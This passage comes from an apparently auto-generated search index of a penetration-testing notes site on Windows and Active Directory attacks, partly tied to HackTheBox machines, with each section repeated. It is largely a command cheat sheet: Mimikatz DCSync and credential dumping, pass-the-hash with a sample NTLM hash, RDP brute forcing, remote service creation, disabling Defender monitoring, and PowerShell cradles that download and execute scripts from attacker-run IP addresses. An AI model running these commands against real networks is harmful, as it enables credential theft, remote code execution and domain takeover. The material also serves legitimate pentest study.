Winexe remotely executes commands on Windows NT/2000/XP/2003 systems from GNU/Linux (and possibly also from other Unices capable of building the Samba 4 software package).- https://sourceforge.net/projects/winexe/ PowerUpSQL Dumping Active Directory Domain Info \u2013 with PowerUpSQL!: https://blog.netspi.com/dumping-active-directory-domain-info-with-powerupsql/ Bloodhound BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment. Attackers can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify. GitHub: https://github.com/BloodHoundAD/BloodHound Find where domain admins are logged in: python http://bloodhound.py -u USERNAME -p PASSWORD -d DOMAIN_NAME -dc DOMAIN_CONTROLLER_HOSTNAME neo4j start bloodhound Mimkatz Mimikatz 2.0 - Golden Ticket Walkthrough: https://www.beneaththewaves.net/Projects/Mimikatz_20_-_Golden_Ticket_Walkthrough.html DCSync https://adsecurity.org/?p=1729 mimikatz \u201clsadump::dcsync /domain:rd.adsecurity.org /user:krbtgt\u201d mimikatz \u201clsadump::dcsync /domain:rd.adsecurity.org /user:Administrator\u201d \u201cimpersonates\u201d a Domain Controller and requests account password data from the targeted Domain Controller. Required Permissions: Any member of Administrators , Domain Admins , or Enterprise Admins as well as Domain Controller computer accounts. Read-Only Domain Controllers are not allowed to pull password data for users by default. Prior to DCSync was to run Mimikatz or Invoke-Mimikatz on a Domain Controller to get the KRBTGT password hash to create Golden Tickets With DCSync, the attacker can pull the password hash, as well as previous password hashes, from a Domain Controller over the network without requiring interactive logon or copying off the Active Directory database file (ntds.dit). Internals: * Discovers Domain Controller in the specified domain name. * Requests the Domain Controller replicate the user credentials via GetNCChanges (leveraging Directory Replication Service (DRS) Remote Protocol) \u201cThe client DC sends a DSGetNCChanges request to the server when the first one wants to get AD objects updates from the second one. The response contains a set of updates that the client has to apply to its NC replica. It is possible that the set of updates is too large for only one response message. In those cases, multiple DSGetNCChanges requests and responses are done. This process is called replication cycle or simply cycle.\u201d \u201cWhen a DC receives a DSReplicaSync Request, then for each DC that it replicates from (stored in RepsFrom data structure) it performs a replication cycle where it behaves like a client and makes DSGetNCChanges requests to that DC. So it gets up-to-date AD objects from each of the DC\u2019s which it replicates from.\u201d Sys Internals https://technet.microsoft.com/en-in/sysinternals/bb545021.aspx PsExec - Execute processes on remote machine PsFile - Displays list of files opened remotely. PsGetSid - Translate SID to display name and vice versa PsKill - Kill processes on local or remote machine PsInfo - Displays installation, install date, kernel build, physical memory, processors type and number, etc. PsList - Displays process, CPU, Memory, thread statistics PsLoggedOn - Displays local and remote logged users PsLogList - View Event logs localrecon.cmd Utility to generate a summary of a Windows system https://github.com/bitsadmin/miscellaneous/blob/master/localrecon.cmd","title":"Tools"},{"location":"os/windows/y-Tools/#tools","text":"","title":"Tools"},{"location":"os/windows/y-Tools/#ntdsxtract","text":"Active Directory forensic framework -\u200b https://github.com/csababarta/ntdsxtract Extract users from ESE DB export: dsusers.py kotarak.dit.export/datatable.3 kotarak.dit.export/link_table.5 hashdump --syshive kotarak.bin --passwordhashes --lmoutfile lmout.txt --ntoutfile ntout.txt --pwdformat ophc Practice: - HTB: Kotarak","title":"ntdsXtract"},{"location":"os/windows/y-Tools/#libesedb","text":"libesedb is a library to access the Extensible Storage Engine (ESE) Database File (EDB) format. The ESE database format is used in may different applications like Windows Search, Windows Mail, Exchange, Active Directory, etc. https://github.com/libyal/libesedb Dump tables: esedbexport -m tables 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit Practice: - HTB: Kotarak","title":"LibEseDB"},{"location":"os/windows/y-Tools/#winexe","text":"Winexe remotely executes commands on Windows NT/2000/XP/2003 systems from GNU/Linux (and possibly also from other Unices capable of building the Samba 4 software package).- https://sourceforge.net/projects/winexe/","title":"WinEXE"},{"location":"os/windows/y-Tools/#powerupsql","text":"Dumping Active Directory Domain Info \u2013 with PowerUpSQL!: https://blog.netspi.com/dumping-active-directory-domain-info-with-powerupsql/","title":"PowerUpSQL"},{"location":"os/windows/y-Tools/#bloodhound","text":"BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment. Attackers can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify. GitHub: https://github.com/BloodHoundAD/BloodHound Find where domain admins are logged in: python http://bloodhound.py -u USERNAME -p PASSWORD -d DOMAIN_NAME -dc DOMAIN_CONTROLLER_HOSTNAME neo4j start bloodhound","title":"Bloodhound"},{"location":"os/windows/y-Tools/#mimkatz","text":"Mimikatz 2.0 - Golden Ticket Walkthrough: https://www.beneaththewaves.net/Projects/Mimikatz_20_-_Golden_Ticket_Walkthrough.html","title":"Mimkatz"},{"location":"os/windows/y-Tools/#dcsync","text":"https://adsecurity.org/?p=1729 mimikatz \u201clsadump::dcsync /domain:rd.adsecurity.org /user:krbtgt\u201d mimikatz \u201clsadump::dcsync /domain:rd.adsecurity.org /user:Administrator\u201d \u201cimpersonates\u201d a Domain Controller and requests account password data from the targeted Domain Controller. Required Permissions: Any member of Administrators , Domain Admins , or Enterprise Admins as well as Domain Controller computer accounts. Read-Only Domain Controllers are not allowed to pull password data for users by default. Prior to DCSync was to run Mimikatz or Invoke-Mimikatz on a Domain Controller to get the KRBTGT password hash to create Golden Tickets With DCSync, the attacker can pull the password hash, as well as previous password hashes, from a Domain Controller over the network without requiring interactive logon or copying off the Active Directory database file (ntds.dit). Internals: * Discovers Domain Controller in the specified domain name. * Requests the Domain Controller replicate the user credentials via GetNCChanges (leveraging Directory Replication Service (DRS) Remote Protocol) \u201cThe client DC sends a DSGetNCChanges request to the server when the first one wants to get AD objects updates from the second one. The response contains a set of updates that the client has to apply to its NC replica. It is possible that the set of updates is too large for only one response message. In those cases, multiple DSGetNCChanges requests and responses are done. This process is called replication cycle or simply cycle.\u201d \u201cWhen a DC receives a DSReplicaSync Request, then for each DC that it replicates from (stored in RepsFrom data structure) it performs a replication cycle where it behaves like a client and makes DSGetNCChanges requests to that DC. So it gets up-to-date AD objects from each of the DC\u2019s which it replicates from.\u201d","title":"DCSync"},{"location":"os/windows/y-Tools/#sys-internals","text":"https://technet.microsoft.com/en-in/sysinternals/bb545021.aspx PsExec - Execute processes on remote machine PsFile - Displays list of files opened remotely. PsGetSid - Translate SID to display name and vice versa PsKill - Kill processes on local or remote machine PsInfo - Displays installation, install date, kernel build, physical memory, processors type and number, etc. PsList - Displays process, CPU, Memory, thread statistics PsLoggedOn - Displays local and remote logged users PsLogList - View Event logs","title":"Sys Internals"},{"location":"os/windows/y-Tools/#localreconcmd","text":"Utility to generate a summary of a Windows system https://github.com/bitsadmin/miscellaneous/blob/master/localrecon.cmd","title":"localrecon.cmd"},{"location":"os/windows/z-References/","text":"References Schtasks without Schtasks.exe via Reflective DLL: https://ijustwannared.team/2018/08/13/schtasks-without-schtasks-exe-via-reflective-dll/ Windows 10 Persistence via PATH directories - CDPSvc: https://www.a12d404.net/windows/2019/01/13/persistance-via-path-directories.html CDPSvc (Connected Devices Platform Service) searches the file cdpsgshims.dll inside PATH directories and loads it if found. With a default Windows installation, there can\u2019t be a non-admin directory in the PATH, so this can\u2019t be exploited. A sample DLL (source included) that executes calc.exe is available here: https://github.com/marpie/a12d404.net-files/tree/master/CDPSvcPersist Useful for vulnerability research workflows on Windows: https://gist.github.com/jthuraisamy/af862987fff437daec52ee3cc5894203 Windows 10 Device Security: https://query.prod.cms.rt.microsoft.com/cms/api/am/binary/RE2IIVu Windows Command Line cheatsheet (part 1): some useful tips: https://www.andreafortuna.org/technology/windows/windows-command-line-cheatsheet-part-1-some-useful-tips/ Windows Command Line cheatsheet (part 2): WMIC: https://www.andreafortuna.org/dfir/windows-command-line-cheatsheet-part-2-wmic/","title":"References"},{"location":"os/windows/z-References/#references","text":"Schtasks without Schtasks.exe via Reflective DLL: https://ijustwannared.team/2018/08/13/schtasks-without-schtasks-exe-via-reflective-dll/ Windows 10 Persistence via PATH directories - CDPSvc: https://www.a12d404.net/windows/2019/01/13/persistance-via-path-directories.html CDPSvc (Connected Devices Platform Service) searches the file cdpsgshims.dll inside PATH directories and loads it if found. With a default Windows installation, there can\u2019t be a non-admin directory in the PATH, so this can\u2019t be exploited. A sample DLL (source included) that executes calc.exe is available here: https://github.com/marpie/a12d404.net-files/tree/master/CDPSvcPersist Useful for vulnerability research workflows on Windows: https://gist.github.com/jthuraisamy/af862987fff437daec52ee3cc5894203 Windows 10 Device Security: https://query.prod.cms.rt.microsoft.com/cms/api/am/binary/RE2IIVu Windows Command Line cheatsheet (part 1): some useful tips: https://www.andreafortuna.org/technology/windows/windows-command-line-cheatsheet-part-1-some-useful-tips/ Windows Command Line cheatsheet (part 2): WMIC: https://www.andreafortuna.org/dfir/windows-command-line-cheatsheet-part-2-wmic/","title":"References"},{"location":"os/windows/credentials/hashed-credentials/","text":"Hashes and Credentials LM hashes Password longer than 7 is split and each half hashed separately Passwords are converted into uppercase No salt Empty LM hash AAD3B435B51404EE AAD3B435B51404EEAAD3B435B51404EE NTLM hashes Dumping hashes Cannot copy SAM when sys is in use Capturing Hashes Responder Inveigh Impacket's smbserver.py Pass the Hash Auth using username and NTLM hash (since NTLM and LM hashes are not salted) Replace \"no password\" in dump wih empty LM hash Copy admins dumped hash (LM:NTML) export SMBHASH=LM:NTML pth-winexe -U administrator% //ip cmd pth-winexe pth-winexe -U jeeves/Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //10.10.10.63 cmd RDP ncrack -v -f --user administrator -P password.txt rdp://ip,CL=1 LSASS References Extracting User Password Data with Mimikatz DCSync: https://blog.stealthbits.com/extracting-user-password-data-with-mimikatz-dcsync/ Pwning with Responder \u2013 A Pentester\u2019s Guide: https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/","title":"Hashes and Credentials"},{"location":"os/windows/credentials/hashed-credentials/#hashes-and-credentials","text":"","title":"Hashes and Credentials"},{"location":"os/windows/credentials/hashed-credentials/#lm-hashes","text":"Password longer than 7 is split and each half hashed separately Passwords are converted into uppercase No salt Empty LM hash AAD3B435B51404EE AAD3B435B51404EEAAD3B435B51404EE","title":"LM hashes"},{"location":"os/windows/credentials/hashed-credentials/#ntlm-hashes","text":"","title":"NTLM hashes"},{"location":"os/windows/credentials/hashed-credentials/#dumping-hashes","text":"Cannot copy SAM when sys is in use","title":"Dumping hashes"},{"location":"os/windows/credentials/hashed-credentials/#capturing-hashes","text":"","title":"Capturing Hashes"},{"location":"os/windows/credentials/hashed-credentials/#responder","text":"","title":"Responder"},{"location":"os/windows/credentials/hashed-credentials/#inveigh","text":"","title":"Inveigh"},{"location":"os/windows/credentials/hashed-credentials/#impackets-smbserverpy","text":"","title":"Impacket's smbserver.py"},{"location":"os/windows/credentials/hashed-credentials/#pass-the-hash","text":"Auth using username and NTLM hash (since NTLM and LM hashes are not salted) Replace \"no password\" in dump wih empty LM hash Copy admins dumped hash (LM:NTML) export SMBHASH=LM:NTML pth-winexe -U administrator% //ip cmd","title":"Pass the Hash"},{"location":"os/windows/credentials/hashed-credentials/#pth-winexe","text":"pth-winexe -U jeeves/Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //10.10.10.63 cmd","title":"pth-winexe"},{"location":"os/windows/credentials/hashed-credentials/#rdp","text":"ncrack -v -f --user administrator -P password.txt rdp://ip,CL=1","title":"RDP"},{"location":"os/windows/credentials/hashed-credentials/#lsass","text":"","title":"LSASS"},{"location":"os/windows/credentials/hashed-credentials/#references","text":"Extracting User Password Data with Mimikatz DCSync: https://blog.stealthbits.com/extracting-user-password-data-with-mimikatz-dcsync/ Pwning with Responder \u2013 A Pentester\u2019s Guide: https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/","title":"References"},{"location":"os/windows/credentials/using-credentials/","text":"Using Credentials Password Spraying auxiliary/scanner/smb/smb_login Send the same credentials to all hosts listening on 445 msf auxiliary(smb_login) services -p 445 -R Can do same with CrackMapExec for a subnet: https://github.com/byt3bl33d3r/CrackMapExec Can use following command to explore: net use \\\\machine-name /user:username@domainname passwords dir \\\\machine-name\\c$ net use Can be detected by using net session Can terminate all session with net use /delete * Some commands, such as net view use the login user-name. .: use runas runas /netonly /user:user@domainname cmd.exe net view \\\\machine-name /all Verify it uses Kerberos by klist Get shells psexec auxiliary/admin/smb/psexec auxiliary/admin/smb/psexec_comman psexec.py - https://github.com/CoreSecurity/impacket PsExec is a light-weight telnet-replacement that lets you execute processes on other systems, complete with full interactivity for console applications, without having to manually install client software PsExec.exe \\\\machinename -u user@domainname -p password cmd.exe -s to get SYSTEM shell Use runas to use Kerberos TGT and avoid giving password: runas /netonly /user:user@domainname PsExec.exe \\\\machinename -u user@domainname cmd.exe Manual Operation - Copy a binary to the ADMIN$ share over SMB ( C:\\Windows\\PSEXECSVC.exe. ) - copy example.exe \\\\machine\\ADMIN$ - Create a service on the remote matching pointing to the binary - sc \\\\machine create serviceName binPath=\"c:\\Windows\\example.exe\" - Remotely start the service - sc \\\\machine start serviceName - When exited, stop the service and delete the binary - del \\\\machine\\ADMIN$\\example.exe smbexec.pp Stealthier (does not drop a binary) Creates a service Service File Name contains a command string to execute (%COMSPEC% points to the absolute path of cmd.exe) Echos the command to be executed to a bat file, redirects the stdout and stderr to a Temp file, then executes the bat file and deletes it. Creates a log entry for each command. Use Metasploit web_delivery to send script sc \\\\machine create serviceName binPath= powershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $k.downloadstring('http://10.9.122.8:8080/AZPLhG9txdFhS9n'); sc \\\\machine start serviceName Winexe https://sourceforge.net/projects/winexe/ Pass the hash pth-winexe -U jeeves/Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //10.10.10.63 cmd wmiexec.py Windows Management Instrumentation (WMI) to launch a semi-interactive shell. WMI is the infrastructure for management data and operations on Windows (like SNMP). wmic computerystem list full /format:list wmic process list /format:list wmic ntdomain list /format:list wmic useraccount list /format:list wmic group list /format:list wmic sysaccount list /format:list https://techcommunity.microsoft.com/t5/Ask-The-Performance-Team/Useful-WMIC-Queries/ba-p/375023 https://windowstech.net/wmic-commands/ Can query remotely. Logging for WMI events is disabled by default: https://msdn.microsoft.com/en-us/library/windows/desktop/aa826686(v=vs.85).aspx wmic wmic /node: machinename /user: username computerystem list full /format:list Local admins on a remote machine wmic /node:ordws01 path win32_groupuser where (groupcomponent= win32_group.name=\\ administrators\\ ,domain=\\ ORDWS01\\ ) Who is logged-in: wmic /node:ordws01 path win32_loggedonuser get antecedent Read nodes from text file: wmic /node:@workstations.txt path win32_loggedonuser get antecedent Execute command: powershell.exe -NoP -sta -NonI -W Hidden -Enc JABXAEMAPQBOAEUAVwAtAE8AQgBKAGUAQw...truncated... wmic /node:ordws01 /user:CSCOU\\jarrieta path win32_process call create **empire launcher string here** Used in: https://github.com/samratashok/nishang https://github.com/PowerShellMafia/PowerSploit CrackMapExec wmiexec.py wmis Windows Remote Management (WinRM) 5985/tcp (HTTP) / 5986/tcp (HTTPS) Allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilizing WMI. Enable: Enable-PSRemoting -Force Set-Item wsman:\\localhost\\client\\trustedhosts * Test if target is configured for WinRM: Test-WSMan machinename Execute command: Invoke-Command -Computer ordws01 -ScriptBlock {ipconfig /all} -credential CSCOU\\jarrieta Command line: Enter-PSSession -Computer ordws01 -credential CSCOU\\jarrieta Force enabling WinRM: PS C:\\tools\\SysinternalsSuite .\\PsExec.exe \\\\ordws04 -u cscou\\jarrieta -p nastyCutt3r -h -d powershell.exe enable-psremoting -force CrackMapExec \"-x\" parameter to send commands. wmiexec.py across multiple IPs Using Remote Desktop Impacket's rdp_check to see if you have RDP access, Then use Kali's rdesktop to connect: References https://blog.ropnop.com/using-credentials-to-own-windows-boxes/","title":"Using Credentials"},{"location":"os/windows/credentials/using-credentials/#using-credentials","text":"","title":"Using Credentials"},{"location":"os/windows/credentials/using-credentials/#password-spraying","text":"auxiliary/scanner/smb/smb_login Send the same credentials to all hosts listening on 445 msf auxiliary(smb_login) services -p 445 -R Can do same with CrackMapExec for a subnet: https://github.com/byt3bl33d3r/CrackMapExec Can use following command to explore: net use \\\\machine-name /user:username@domainname passwords dir \\\\machine-name\\c$ net use Can be detected by using net session Can terminate all session with net use /delete * Some commands, such as net view use the login user-name. .: use runas runas /netonly /user:user@domainname cmd.exe net view \\\\machine-name /all Verify it uses Kerberos by klist","title":"Password Spraying"},{"location":"os/windows/credentials/using-credentials/#get-shells","text":"","title":"Get shells"},{"location":"os/windows/credentials/using-credentials/#psexec","text":"auxiliary/admin/smb/psexec auxiliary/admin/smb/psexec_comman psexec.py - https://github.com/CoreSecurity/impacket PsExec is a light-weight telnet-replacement that lets you execute processes on other systems, complete with full interactivity for console applications, without having to manually install client software PsExec.exe \\\\machinename -u user@domainname -p password cmd.exe -s to get SYSTEM shell Use runas to use Kerberos TGT and avoid giving password: runas /netonly /user:user@domainname PsExec.exe \\\\machinename -u user@domainname cmd.exe Manual Operation - Copy a binary to the ADMIN$ share over SMB ( C:\\Windows\\PSEXECSVC.exe. ) - copy example.exe \\\\machine\\ADMIN$ - Create a service on the remote matching pointing to the binary - sc \\\\machine create serviceName binPath=\"c:\\Windows\\example.exe\" - Remotely start the service - sc \\\\machine start serviceName - When exited, stop the service and delete the binary - del \\\\machine\\ADMIN$\\example.exe","title":"psexec"},{"location":"os/windows/credentials/using-credentials/#smbexecpp","text":"Stealthier (does not drop a binary) Creates a service Service File Name contains a command string to execute (%COMSPEC% points to the absolute path of cmd.exe) Echos the command to be executed to a bat file, redirects the stdout and stderr to a Temp file, then executes the bat file and deletes it.","title":"smbexec.pp"},{"location":"os/windows/credentials/using-credentials/#creates-a-log-entry-for-each-command","text":"Use Metasploit web_delivery to send script sc \\\\machine create serviceName binPath= powershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $k.downloadstring('http://10.9.122.8:8080/AZPLhG9txdFhS9n'); sc \\\\machine start serviceName","title":"Creates a log entry for each command."},{"location":"os/windows/credentials/using-credentials/#winexe","text":"https://sourceforge.net/projects/winexe/","title":"Winexe"},{"location":"os/windows/credentials/using-credentials/#pass-the-hash","text":"pth-winexe -U jeeves/Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //10.10.10.63 cmd","title":"Pass the hash"},{"location":"os/windows/credentials/using-credentials/#wmiexecpy","text":"Windows Management Instrumentation (WMI) to launch a semi-interactive shell. WMI is the infrastructure for management data and operations on Windows (like SNMP). wmic computerystem list full /format:list wmic process list /format:list wmic ntdomain list /format:list wmic useraccount list /format:list wmic group list /format:list wmic sysaccount list /format:list https://techcommunity.microsoft.com/t5/Ask-The-Performance-Team/Useful-WMIC-Queries/ba-p/375023 https://windowstech.net/wmic-commands/ Can query remotely. Logging for WMI events is disabled by default: https://msdn.microsoft.com/en-us/library/windows/desktop/aa826686(v=vs.85).aspx wmic wmic /node: machinename /user: username computerystem list full /format:list Local admins on a remote machine wmic /node:ordws01 path win32_groupuser where (groupcomponent= win32_group.name=\\ administrators\\ ,domain=\\ ORDWS01\\ ) Who is logged-in: wmic /node:ordws01 path win32_loggedonuser get antecedent Read nodes from text file: wmic /node:@workstations.txt path win32_loggedonuser get antecedent Execute command: powershell.exe -NoP -sta -NonI -W Hidden -Enc JABXAEMAPQBOAEUAVwAtAE8AQgBKAGUAQw...truncated... wmic /node:ordws01 /user:CSCOU\\jarrieta path win32_process call create **empire launcher string here** Used in: https://github.com/samratashok/nishang https://github.com/PowerShellMafia/PowerSploit CrackMapExec wmiexec.py wmis","title":"wmiexec.py"},{"location":"os/windows/credentials/using-credentials/#windows-remote-management-winrm","text":"5985/tcp (HTTP) / 5986/tcp (HTTPS) Allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilizing WMI. Enable: Enable-PSRemoting -Force Set-Item wsman:\\localhost\\client\\trustedhosts * Test if target is configured for WinRM: Test-WSMan machinename Execute command: Invoke-Command -Computer ordws01 -ScriptBlock {ipconfig /all} -credential CSCOU\\jarrieta Command line: Enter-PSSession -Computer ordws01 -credential CSCOU\\jarrieta Force enabling WinRM: PS C:\\tools\\SysinternalsSuite .\\PsExec.exe \\\\ordws04 -u cscou\\jarrieta -p nastyCutt3r -h -d powershell.exe enable-psremoting -force","title":"Windows Remote Management (WinRM)"},{"location":"os/windows/credentials/using-credentials/#crackmapexec","text":"\"-x\" parameter to send commands. wmiexec.py across multiple IPs","title":"CrackMapExec"},{"location":"os/windows/credentials/using-credentials/#using-remote-desktop","text":"Impacket's rdp_check to see if you have RDP access, Then use Kali's rdesktop to connect:","title":"Using Remote Desktop"},{"location":"os/windows/credentials/using-credentials/#references","text":"https://blog.ropnop.com/using-credentials-to-own-windows-boxes/","title":"References"},{"location":"os/windows/powershell/0-cheatsheet/","text":"Cheatsheet Help System Get-Help Get-Process help Get-Process Update-Help Get-Help remoting Get-Help about_*remot* Get-Command -CommandTyle Cmdlet Basic Constructs Cmdlets Function Aliases Get-Alias -Name ps Get-Alias -Definition Get-Process Check Environment Version info: powershell -v 2.0 -c $psversiontable Language mode: $host.runspace.languagemode Check if AppLocker is enabled: Get-AppLockerPolicy -Local Download Files powershell wget http://example.com/abc.txt -outfile abc.txt Execution Policy Not a security feature Used to avoid accidental script execution Can be bypass with: powershell -executionpolicy bypass .\\example.ps1 powershell -c cmd powershell -enc Ref https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-6 Modules Import-Module path_to_module -verbose Get-Module -ListAvailable Get-Command -Module module_name Remote Script execution Invoke-Expression (New-Object Net.WebClient).DownloadString('http://example.com/example.ps1'); iex (New-Object Net.WebClient).DownloadString('http://example.com/example.ps1'); powershell -EncodedCommand Base64EncodedCommand START /B \u200b \u200b powershell -c IEX (\u200b New-Object Net.Webclient).downloadstring(\u200b 'http://10.10.14.2/shell.ps1'\u200b ) /B prevents creation of a new window Craft Download Cradles: https://github.com/danielbohannon/Invoke-CradleCrafter Command History (PSReadline) cat (Get-PSReadlineOption).HistorySavePath | sls password By default, the path is: profile:\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt Powershell Remoting Enabled by default from Windows Server 2012 Admin privileges are required to connect One to One Uses PSSession Interactive, stateful session Run in a new process wsmprovhost Useful cmdlets New-PSSession Enter-PSSession Set-MpPreference -DisableRealtimeMonitoring $true New-PSSession -ComputerName instance $sess = New-PSSession -ComputerName instance Enter-PSSEssion - Session $sess One to Many (Fan-out Remoting) Non-interactive Parallel command execution Can execute scripts from files Usable to perform command execution without dropping exe onto disk Useful for passing and replying hashes, tickets and other AD attacks Run commands: Invoke-Command -ScriptBlock{whoami;hostname} -ComputerName instance Run scripts: Invoke-Command -FilePath example.ps1 -ComputerName instance Run functions installed on the remote box: Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -ComputerName instance Stateful commands: $sess = New-PSSession -ComputerName instance Invoke-Command -Session $sess -ScriptBlock {$proc = Get-Process} Invoke-Command -Session $sess -ScriptBlock {$proc.Name} Mimikatz (ReflectivePEInjection is used to load into memory) Invoke-Mimikatz -DumpCreds Invoke-Mimikatz -DumpCerts Pass the Hash Invoke-Mimikatz -Command ' sekurlsa::pth /user: name_of_the_user /domain:. /ntlm: ntlmhash /run:powershell.exe ' Invoke-Mimikatz -Command ' sekurlsa::pth /user:Administrator /domain:. /ntlm: ntlmhash /run:powershell.exe ' Dump Creds from multiple machines Invoke-Mimikatz -DumpCreds -ComputerName @( instance1 , instance2 ) Load PowerUp powershell -ExecutionPolicy Bypass Import-Module ./PowerUp.ps1\u200b Invoke-AllChecks\u200b","title":"Cheatsheet"},{"location":"os/windows/powershell/0-cheatsheet/#cheatsheet","text":"","title":"Cheatsheet"},{"location":"os/windows/powershell/0-cheatsheet/#help-system","text":"Get-Help Get-Process help Get-Process Update-Help Get-Help remoting Get-Help about_*remot* Get-Command -CommandTyle Cmdlet","title":"Help System"},{"location":"os/windows/powershell/0-cheatsheet/#basic-constructs","text":"Cmdlets Function","title":"Basic Constructs"},{"location":"os/windows/powershell/0-cheatsheet/#aliases","text":"Get-Alias -Name ps Get-Alias -Definition Get-Process","title":"Aliases"},{"location":"os/windows/powershell/0-cheatsheet/#check-environment","text":"Version info: powershell -v 2.0 -c $psversiontable Language mode: $host.runspace.languagemode Check if AppLocker is enabled: Get-AppLockerPolicy -Local","title":"Check Environment"},{"location":"os/windows/powershell/0-cheatsheet/#download-files","text":"powershell wget http://example.com/abc.txt -outfile abc.txt","title":"Download Files"},{"location":"os/windows/powershell/0-cheatsheet/#execution-policy","text":"Not a security feature Used to avoid accidental script execution Can be bypass with: powershell -executionpolicy bypass .\\example.ps1 powershell -c cmd powershell -enc Ref https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-6","title":"Execution Policy"},{"location":"os/windows/powershell/0-cheatsheet/#modules","text":"Import-Module path_to_module -verbose Get-Module -ListAvailable Get-Command -Module module_name","title":"Modules"},{"location":"os/windows/powershell/0-cheatsheet/#remote-script-execution","text":"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://example.com/example.ps1'); iex (New-Object Net.WebClient).DownloadString('http://example.com/example.ps1'); powershell -EncodedCommand Base64EncodedCommand START /B \u200b \u200b powershell -c IEX (\u200b New-Object Net.Webclient).downloadstring(\u200b 'http://10.10.14.2/shell.ps1'\u200b ) /B prevents creation of a new window Craft Download Cradles: https://github.com/danielbohannon/Invoke-CradleCrafter","title":"Remote Script execution"},{"location":"os/windows/powershell/0-cheatsheet/#command-history-psreadline","text":"cat (Get-PSReadlineOption).HistorySavePath | sls password By default, the path is: profile:\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt","title":"Command History (PSReadline)"},{"location":"os/windows/powershell/0-cheatsheet/#powershell-remoting","text":"Enabled by default from Windows Server 2012 Admin privileges are required to connect","title":"Powershell Remoting"},{"location":"os/windows/powershell/0-cheatsheet/#one-to-one","text":"Uses PSSession Interactive, stateful session Run in a new process wsmprovhost","title":"One to One"},{"location":"os/windows/powershell/0-cheatsheet/#useful-cmdlets","text":"New-PSSession Enter-PSSession Set-MpPreference -DisableRealtimeMonitoring $true New-PSSession -ComputerName instance $sess = New-PSSession -ComputerName instance Enter-PSSEssion - Session $sess","title":"Useful cmdlets"},{"location":"os/windows/powershell/0-cheatsheet/#one-to-many-fan-out-remoting","text":"Non-interactive Parallel command execution Can execute scripts from files Usable to perform command execution without dropping exe onto disk Useful for passing and replying hashes, tickets and other AD attacks Run commands: Invoke-Command -ScriptBlock{whoami;hostname} -ComputerName instance Run scripts: Invoke-Command -FilePath example.ps1 -ComputerName instance Run functions installed on the remote box: Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -ComputerName instance Stateful commands: $sess = New-PSSession -ComputerName instance Invoke-Command -Session $sess -ScriptBlock {$proc = Get-Process} Invoke-Command -Session $sess -ScriptBlock {$proc.Name} Mimikatz (ReflectivePEInjection is used to load into memory) Invoke-Mimikatz -DumpCreds Invoke-Mimikatz -DumpCerts Pass the Hash Invoke-Mimikatz -Command ' sekurlsa::pth /user: name_of_the_user /domain:. /ntlm: ntlmhash /run:powershell.exe ' Invoke-Mimikatz -Command ' sekurlsa::pth /user:Administrator /domain:. /ntlm: ntlmhash /run:powershell.exe ' Dump Creds from multiple machines Invoke-Mimikatz -DumpCreds -ComputerName @( instance1 , instance2 )","title":"One to Many (Fan-out Remoting)"},{"location":"os/windows/powershell/0-cheatsheet/#load-powerup","text":"powershell -ExecutionPolicy Bypass Import-Module ./PowerUp.ps1\u200b Invoke-AllChecks\u200b","title":"Load PowerUp"},{"location":"os/windows/powershell/collections/","text":"Collections https://sid-500.com/downloads/ Resource: Infosec PowerShell tools, resources, and authors: https://www.peerlyst.com/posts/resource-infosec-powershell-tools-resources-and-authors?utm_source=twitter utm_medium=social utm_content=peerlyst_post utm_campaign=peerlyst_shared_post Mayhem scripts: https://gist.github.com/M3T4L5T3F Collection of PowerShell network security scripts for system administrators.: https://github.com/thom-s/netsec-ps-scripts","title":"Collections"},{"location":"os/windows/powershell/collections/#collections","text":"https://sid-500.com/downloads/ Resource: Infosec PowerShell tools, resources, and authors: https://www.peerlyst.com/posts/resource-infosec-powershell-tools-resources-and-authors?utm_source=twitter utm_medium=social utm_content=peerlyst_post utm_campaign=peerlyst_shared_post Mayhem scripts: https://gist.github.com/M3T4L5T3F Collection of PowerShell network security scripts for system administrators.: https://github.com/thom-s/netsec-ps-scripts","title":"Collections"},{"location":"os/windows/powershell/modules/","text":"Modules Port Scaning https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Invoke-Portscan.ps1 https://github.com/samratashok/nishang/blob/master/Scan/Invoke-PortScan.ps1 Brute Forcing https://github.com/samratashok/nishang/blob/master/Scan/Invoke-BruteForce.ps1 https://github.com/NetSPI/PowerShell/blob/master/Invoke-ExternalDomainBruteforce.ps1 Database Attacks PowerUpSQL - Toolkit for Attacking SQL Server: https://github.com/NetSPI/PowerUpSQL Encoding Payloads https://github.com/samratashok/nishang/blob/master/Utility/Invoke-Encode.ps1 Capture NTLM https://github.com/Kevin-Robertson/Inveigh Obfuscation https://github.com/danielbohannon/Invoke-Obfuscation https://github.com/danielbohannon/Invoke-DOSfuscation Fileless Malware Invoke-NoShell outputs a Microsoft Office Word .doc file with an embedded macro: 